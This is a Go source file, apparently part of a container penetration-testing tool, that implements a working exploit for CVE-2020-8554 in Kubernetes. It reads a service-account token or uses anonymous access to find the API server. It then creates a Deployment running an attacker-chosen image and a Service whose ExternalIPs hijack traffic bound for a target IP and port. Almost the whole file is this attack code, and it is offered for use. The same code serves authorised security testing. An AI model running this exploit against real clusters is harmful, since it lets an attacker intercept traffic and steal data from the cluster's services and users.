package attack

import (
	"fmt"
	"log"
	"strings"

	"github.com/KPT/conf"
	"github.com/KPT/gadget/kubectl"
)

var K8sDeploymentsAPI = "/apis/apps/v1/namespaces/default/deployments"
var K8sMitmPayloadDeploy = `{
    "apiVersion": "apps/v1",
    "kind": "Deployment",
    "metadata": {
        "name": "mitm-payload-deploy"
    },
    "spec": {
        "replicas": 1,
        "selector": {
            "matchLabels": {
                "app": "mitm-payload-deploy"
            }
        },
        "template": {
            "metadata": {
                "labels": {
                    "app": "mitm-payload-deploy"
                }
            },
            "spec": {
                "containers": [
                    {
                        "image": "${image}",
                        "name": "mitm-payload-deploy",
                        "ports": [
                            {
                                "containerPort": ${port},
                                "name": "tcp"
                            }
                        ]
                    }
                ]
            }
        }
    }
}`

var K8sServicesApi = "/api/v1/namespaces/default/services"
var K8sMitmPayloadSvc = `{
    "apiVersion": "v1",
    "kind": "Service",
    "metadata": {
        "name": "mitm-externalip"
    },
    "spec": {
        "externalIPs": [
            "${ip}"
        ],
        "ports": [
            {
                "name": "tcp",
                "port": ${port},
                "targetPort": ${port}
            }
        ],
        "selector": {
            "app": "mitm-payload-deploy"
        },
        "type": "ClusterIP"
    }
}`

func getK8sMitmPayloadDeployJson(image string, port string) string {
	K8sMitmPayloadDeploy = strings.Replace(K8sMitmPayloadDeploy, "${image}", image, -1)
	K8sMitmPayloadDeploy = strings.Replace(K8sMitmPayloadDeploy, "${port}", port, -1)
	return K8sMitmPayloadDeploy
}

func getK8sMitmPayloadSvcJson(ip string, port string) string {
	K8sMitmPayloadSvc = strings.Replace(K8sMitmPayloadSvc, "${ip}", ip, -1)
	K8sMitmPayloadSvc = strings.Replace(K8sMitmPayloadSvc, "${port}", port, -1)
	return K8sMitmPayloadSvc
}

// plugin interface
// type K8sMitmClusteripS struct{}

// func (p K8sMitmClusteripS) Desc() string {
// 	return "Exploit CVE-2020-8554: Man in the middle using ExternalIPs, usage: cdk run k8s-mitm-clusterip (default|anonymous|<service-account-token-path>) <image> <ip> <port>"
// }
func K8sMitmClusterip(token, image, targetIP, targetPort string) bool {
	// args := cli.Args["<args>"].([]string)
	// if len(args) != 4 {
	// 	log.Println("invalid input args.")
	// 	log.Fatal("Exploit CVE-2020-8554: Man in the middle using ExternalIPs, usage: kpt attack mitm [default|anonymous|<service-account-token-path>] [image] [ip] [port]")
	// }

	var TokenPath = ""
	var AnonymousFlag = false

	// token := args[0]
	// image := args[1]
	// targetIP := args[2]
	// targetPort := args[3]

	switch token {
	case "default":
		TokenPath = conf.K8sSATokenDefaultPath
	case "anonymous":
		TokenPath = ""
		AnonymousFlag = true
	default:
		TokenPath = token
	}

	// get api-server connection conf in ENV
	log.Println("getting K8s api-server API addr.")
	addr, err := kubectl.ApiServerAddr()
	if err != nil {
		fmt.Println(err)
		return false
	}
	fmt.Println("\tFind K8s api-server in ENV:", addr)

	// step1. create Mitm Deployments
	optsDeploy := kubectl.K8sRequestOption{
		TokenPath: TokenPath,
		Server:    addr, // default
		Api:       K8sDeploymentsAPI,
		Method:    "POST",
		PostData:  "",
		Anonymous: AnonymousFlag,
	}

	log.Printf("trying to create man in the middle deploy containers with image:%s and port:%s", image, targetPort)
	optsDeploy.PostData = getK8sMitmPayloadDeployJson(image, targetPort)
	resp, err := kubectl.ServerAccountRequest(optsDeploy)
	if err != nil {
		fmt.Println(err)
	}
	log.Println("api-server response:")
	fmt.Println(resp)

	// step2. create Mitm Services of ExternalIPs
	optsSvc := kubectl.K8sRequestOption{
		TokenPath: TokenPath,
		Server:    addr, // default
		Api:       K8sServicesApi,
		Method:    "POST",
		PostData:  "",
		Anonymous: AnonymousFlag,
	}
	log.Printf("trying to create man in the middle ExternalIPs svc ip: %s and port: %s", targetIP, targetPort)
	optsSvc.PostData = getK8sMitmPayloadSvcJson(targetIP, targetPort)
	respSvc, err := kubectl.ServerAccountRequest(optsSvc)
	if err != nil {
		fmt.Println(err)
	}
	log.Println("api-server response:")
	fmt.Println(respSvc)

	return true
}

// func init() {
// 	exploit := K8sMitmClusteripS{}
// 	plugin.RegisterExploit("k8s-mitm-clusterip", exploit)
// 	rand.Seed(time.Now().UnixNano())
// }
